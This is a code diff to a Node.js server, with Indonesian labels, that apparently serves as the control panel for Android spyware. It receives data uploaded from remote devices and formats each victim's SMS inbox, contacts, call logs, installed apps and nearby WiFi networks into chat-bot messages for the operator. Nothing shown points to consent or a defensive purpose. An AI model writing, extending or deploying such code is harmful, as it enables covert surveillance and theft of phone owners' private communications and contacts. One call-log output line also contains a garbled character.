@@ -156,13 +156,21 @@ const notifyDeviceSync = async (deviceId) => {
     }
 };
 
-const formatDeviceResponse = (data) => {
+const formatDeviceResponse = (fullData) => {
+    if (!fullData) return '\n└ [Kosong]';
+    const type = fullData.type;
+    const data = fullData.data;
+
     if (data === null || data === undefined) return '\n└ [Kosong]';
-    if (typeof data === 'string') return `\n└ <code>${escapeHTML(data)}</code>`;
+
+    // String default (untuk pesan sukses/error sederhana)
+    if (typeof data === 'string' && !['sms_inbox', 'sms_list', 'contacts_list', 'app_list', 'wifi_networks', 'wifi_scan', 'call_logs'].includes(type)) {
+        return `\n└ <code>${escapeHTML(data)}</code>`;
+    }
 
     // SMS Inbox / SMS List
-    if (['sms_inbox', 'sms_list'].includes(data.type) && Array.isArray(data.data)) {
-        return '\n' + data.data.map((sms, i) => {
+    if (['sms_inbox', 'sms_list'].includes(type) && Array.isArray(data)) {
+        return '\n' + data.slice(0, 50).map((sms, i) => {
             const sender = sms.from || sms.address || 'Unknown';
             const body = sms.body || sms.message || '';
             return `${i + 1}. 📩 <b>${escapeHTML(sender)}</b>\n   └ ${escapeHTML(body)}`;
@@ -170,50 +178,49 @@ const formatDeviceResponse = (data) => {
     }
 
     // Contact List
-    if (['contact_list', 'contacts'].includes(data.type) && Array.isArray(data.data)) {
-        return '\n' + data.data.map((c, i) => {
+    if ((type === 'contacts_list' || type === 'contacts') && Array.isArray(data)) {
+        return '\n' + data.slice(0, 50).map((c, i) => {
             return `${i + 1}. 👤 <b>${escapeHTML(c.name || 'Unknown')}</b>\n   └ 📞 <code>${escapeHTML(c.number || c.phone || '-')}</code>`;
         }).join('\n\n');
     }
 
-    // Call Logs
-    if (['call_logs', 'calls'].includes(data.type) && Array.isArray(data.data)) {
-        return '\n' + data.data.map((c, i) => {
-            let icon = '📞';
-            if (['INCOMING', '1'].includes(String(c.type))) icon = '📥';
-            else if (['OUTGOING', '2'].includes(String(c.type))) icon = '📤';
-            else if (['MISSED', '3'].includes(String(c.type))) icon = '❌';
-            return `${i + 1}. ${icon} <b>${escapeHTML(c.name || c.number || 'Unknown')}</b>\n   └ <code>${escapeHTML(c.number)}</code> | ⏳ <code>${c.duration_sec || c.duration || 0}s</code>`;
-        }).join('\n\n');
+    // App List
+    if (type === 'app_list' && Array.isArray(data)) {
+        return '\n' + data.slice(0, 100).map((app, i) => {
+            return `${i + 1}. 📦 <b>${escapeHTML(app.name)}</b>\n   └ 🏷 <code>${escapeHTML(app.package)}</code>`;
+        }).join('\n');
     }
 
-    // WiFi Scan
-    if (data.type === 'wifi_networks' && Array.isArray(data.data)) {
-        let sorted = [...data.data].sort((a, b) => (b.level || b.signal || 0) - (a.level || a.signal || 0));
-        const uniqueSsids = new Set();
-        const filtered = sorted.filter(wifi => {
-            const ssid = wifi.ssid || wifi.SSID || '[Hidden SSID]';
-            if (uniqueSsids.has(ssid)) return false;
-            uniqueSsids.add(ssid);
-            return true;
+    // WiFi List (Filtered & Clean)
+    if ((type === 'wifi_networks' || type === 'wifi_scan') && Array.isArray(data)) {
+        const unique = [];
+        const ssids = new Set();
+        [...data].sort((a, b) => (b.level || 0) - (a.level || 0)).forEach(w => {
+            const ssid = w.ssid || w.SSID || '[Hidden SSID]';
+            if (!ssids.has(ssid)) { ssids.add(ssid); unique.push(w); }
         });
-
-        return '\n' + filtered.map((wifi, idx) => {
-            const ss = (wifi.level || wifi.signal || 0);
+        return '\n' + unique.map((w, i) => {
+            const ss = w.level || 0;
             let icon = '📶🔴';
             if (ss >= -50) icon = '📶🔵';
             else if (ss >= -65) icon = '📶🟢';
             else if (ss >= -80) icon = '📶🟡';
-            const ssid = wifi.ssid || wifi.SSID || '[Hidden SSID]';
-            const bssid = wifi.bssid || wifi.BSSID || '-';
-            const freq = (wifi.frequency || wifi.freq || '') ? ` | ${wifi.frequency || wifi.freq} MHz` : '';
-            return `${idx + 1}. ${icon} <b>${escapeHTML(ssid)}</b>\n   └ <code>${ss} dBm</code> | 📍 <code>${escapeHTML(bssid)}</code>${freq}`;
+            return `${i + 1}. ${icon} <b>${escapeHTML(w.ssid || w.SSID || '[Hidden]')}</b>\n   └ 🌩 <code>${ss} dBm</code>`;
+        }).join('\n');
+    }
+
+    // Call Logs
+    if (type === 'call_logs' && Array.isArray(data)) {
+        return '\n' + data.slice(0, 50).map((call, i) => {
+            const icon = call.type === 'incoming' ? '📥' : (call.type === 'outgoing' ? '📤' : (call.type === 'missed' ? '❌' : '📞'));
+            return `${i + 1}. ${icon} <b>${escapeHTML(call.name || call.number)}</b>\n   └ ⏱ ${call.duration} | � ${new Date(call.date).toLocaleString('id-ID')}`;
         }).join('\n\n');
     }
 
+    // Generic Array
     if (Array.isArray(data)) {
         if (data.length === 0) return '\n└ [Data Kosong]';
-        return '\n' + data.map((item, idx) => {
+        return '\n' + data.slice(0, 50).map((item, idx) => {
             const prefix = `${idx + 1}. `;
             if (typeof item === 'object' && item !== null) {
                 return prefix + Object.entries(item)
@@ -1046,7 +1053,7 @@ app.post('/response', upload.single('media_file'), async (req, res) => {
                     await refreshFileList();
                     return res.json({ status: 'received' });
                 }
-                const formattedDisplay = formatDeviceResponse(deviceResponse);
+                const formattedDisplay = formatDeviceResponse(data);
                 await sendOrEdit(`✅ <b>Respon [${escapeHTML(client_id)}]:</b>\n${formattedDisplay}`);
                 if (data.type === 'success' || data.type === 'error') await refreshFileList();
             }
